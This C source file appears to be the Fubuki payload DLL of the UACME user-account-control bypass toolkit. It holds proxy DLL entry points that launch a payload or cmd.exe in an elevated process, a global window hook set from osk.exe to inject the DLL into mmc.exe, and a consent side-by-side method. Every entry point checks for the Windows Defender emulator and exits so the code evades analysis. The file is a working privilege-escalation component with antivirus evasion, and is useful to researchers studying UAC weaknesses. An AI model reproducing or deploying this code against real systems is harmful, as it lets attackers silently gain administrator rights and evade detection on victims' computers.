/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2020
*
*  TITLE:       DLLMAIN.C
*
*  VERSION:     3.50
*
*  DATE:        14 Sep 2020
*
*  Proxy dll entry point.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "fubuki.h"

UACME_PARAM_BLOCK g_SharedParams;
HANDLE g_SyncMutant = NULL;

/*
* DummyFunc
*
* Purpose:
*
* Stub for fake exports.
*
*/
VOID WINAPI DummyFunc(
    VOID
)
{
}

/*
* DefaultPayload
*
* Purpose:
*
* Process parameter if exist or start cmd.exe and exit immediately.
*
*/
VOID DefaultPayload(
    VOID
)
{
    BOOL bSharedParamsReadOk;
    UINT ExitCode;
    PWSTR lpParameter;
    ULONG cbParameter;

    ucmDbgMsg(LoadedMsg);

    //
    // Read shared params block.
    //
    RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
    bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
    if (bSharedParamsReadOk) {
        ucmDbgMsg(L"Fubuki, ucmReadSharedParameters OK\r\n");

        lpParameter = g_SharedParams.szParameter;
        cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
    }
    else {
        ucmDbgMsg(L"Fubuki, ucmReadSharedParameters Failed\r\n");
        lpParameter = NULL;
        cbParameter = 0UL;
    }

    ucmDbgMsg(L"Fubuki, before ucmLaunchPayload\r\n");

    ExitCode = (ucmLaunchPayload(lpParameter, cbParameter) != FALSE);

    ucmDbgMsg(L"Fubuki, after ucmLaunchPayload\r\n");

    //
    // If this is default executable, show runtime info.
    //
    if ((lpParameter == NULL) || (cbParameter == 0)) {
        if (g_SharedParams.AkagiFlag == AKAGI_FLAG_TANGO)
            ucmQueryRuntimeInfo(FALSE);
    }

    //
    // Notify Akagi.
    //
    if (bSharedParamsReadOk) {
        ucmDbgMsg(L"Fubuki, completion\r\n");
        ucmSetCompletion(g_SharedParams.szSignalObject);
    }

    RtlExitUserProcess(ExitCode);
}

/*
* UiAccessMethodHookProc
*
* Purpose:
*
* Window hook procedure for UiAccessMethod
*
*/
LRESULT CALLBACK UiAccessMethodHookProc(
    _In_ int nCode,
    _In_ WPARAM wParam,
    _In_ LPARAM lParam
)
{
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

/*
* UiAccessMethodPayload
*
* Purpose:
*
* Defines application context and either:
* - if fInstallHook set - installs windows hook for dll injection
* - run default payload in target app context
*
*/
VOID UiAccessMethodPayload(
    _In_ HINSTANCE hinstDLL,
    _In_ BOOL fInstallHook,
    _In_opt_ LPWSTR lpTargetApp
)
{
    LPWSTR lpFileName;
    HHOOK hHook;
    HOOKPROC HookProcedure;
    TOKEN_ELEVATION_TYPE TokenType = TokenElevationTypeDefault;
    WCHAR szModuleName[MAX_PATH + 1];

    RtlSecureZeroMemory(szModuleName, sizeof(szModuleName));
    if (GetModuleFileName(NULL, szModuleName, MAX_PATH) == 0)
        return;

    lpFileName = _filename(szModuleName);
    if (lpFileName == NULL)
        return;
   
    if (fInstallHook) {

        //
        // Check if we are in the required application context
        // Are we inside osk.exe?
        //
        if (_strcmpi(lpFileName, TEXT("osk.exe")) == 0) {
            HookProcedure = (HOOKPROC)GetProcAddress(hinstDLL, FUBUKI_WND_HOOKPROC); //UiAccessMethodHookProc
            if (HookProcedure) {
                hHook = SetWindowsHookEx(WH_CALLWNDPROC, HookProcedure, hinstDLL, 0);
                if (hHook) {
                    //
                    // Timeout to be enough to spawn target app.
                    //
                    Sleep(15000);
                    UnhookWindowsHookEx(hHook);
                }
            }
            RtlExitUserProcess(0);
        }
    }

    //
    // If target application name specified - check are we inside target app?
    //
    if (lpTargetApp) {
        if (_strcmpi(lpFileName, lpTargetApp) == 0) {
            DefaultPayload();
        }
    }
    else {
        //
        // Use any suitable elevated context.
        //
        if (ucmGetProcessElevationType(NULL, &TokenType)) {
            if (TokenType == TokenElevationTypeFull) {
                DefaultPayload();
            }
        }
    }
}

/*
* UiAccessMethodDllMain
*
* Purpose:
*
* Proxy dll entry point for uiAccess method.
* Need dedicated entry point because of additional code.
*
*/
BOOL WINAPI UiAccessMethodDllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    WCHAR szMMC[] = { L'm', L'm', L'c', L'.', L'e', L'x', L'e', 0 };
    UNREFERENCED_PARAMETER(lpvReserved);

    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
        RtlExitUserProcess('foff');
    }

    if (fdwReason == DLL_PROCESS_ATTACH) {
        UiAccessMethodPayload(hinstDLL, TRUE, szMMC);
    }

    return TRUE;
}

/*
* DllMain
*
* Purpose:
*
* Default proxy dll entry point.
*
*/
__declspec(dllexport) BOOL WINAPI DllMain(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    UNREFERENCED_PARAMETER(hinstDLL);
    UNREFERENCED_PARAMETER(lpvReserved);

    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
        RtlExitUserProcess('foff');
    }

    if (fdwReason == DLL_PROCESS_ATTACH) {
        DefaultPayload();
    }

    return TRUE;
}

/*
* EntryPointExeMode
*
* Purpose:
*
* Entry point to be used in exe mode.
*
*/
VOID WINAPI EntryPointExeMode(
    VOID)
{
    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
        RtlExitUserProcess('foff');
    }
    DefaultPayload();
}

/*
* EntryPointUIAccessLoader
*
* Purpose:
*
* Entry point to be used in exe mode.
*
*/
VOID WINAPI EntryPointUIAccessLoader(
    VOID)
{
    ULONG r;
    WCHAR szParam[MAX_PATH * 2];

    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
        RtlExitUserProcess('foff');
    }

    if (GetCommandLineParam(GetCommandLine(), 0, szParam, MAX_PATH, &r)) {
        if (r > 0) {
            ucmUIHackExecute(szParam);
        }
    }
    RtlExitUserProcess(0);
}

/*
* EntryPointSxsConsent
*
* Purpose:
*
* Entry point to be used consent sxs method.
*
*/
BOOL WINAPI EntryPointSxsConsent(
    _In_ HINSTANCE hinstDLL,
    _In_ DWORD fdwReason,
    _In_ LPVOID lpvReserved
)
{
    BOOL bSharedParamsReadOk;
    PWSTR lpParameter;
    ULONG cbParameter;

    UNREFERENCED_PARAMETER(lpvReserved);

    ucmDbgMsg(LoadedMsg);

    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED)
        RtlExitUserProcess('foff');


    if (fdwReason == DLL_PROCESS_ATTACH) {

        LdrDisableThreadCalloutsForDll(hinstDLL);

        //
        // Read shared params block.
        //
        RtlSecureZeroMemory(&g_SharedParams, sizeof(g_SharedParams));
        bSharedParamsReadOk = ucmReadSharedParameters(&g_SharedParams);
        if (bSharedParamsReadOk) {
            lpParameter = g_SharedParams.szParameter;
            cbParameter = (ULONG)(_strlen(g_SharedParams.szParameter) * sizeof(WCHAR));
        }
        else {
            lpParameter = NULL;
            cbParameter = 0UL;
        }

        ucmLaunchPayloadEx(
            CreateProcessW,
            lpParameter,
            cbParameter);

        //
        // Notify Akagi.
        //
        if (bSharedParamsReadOk) {
            ucmSetCompletion(g_SharedParams.szSignalObject);
        }

    }
    return TRUE;
}
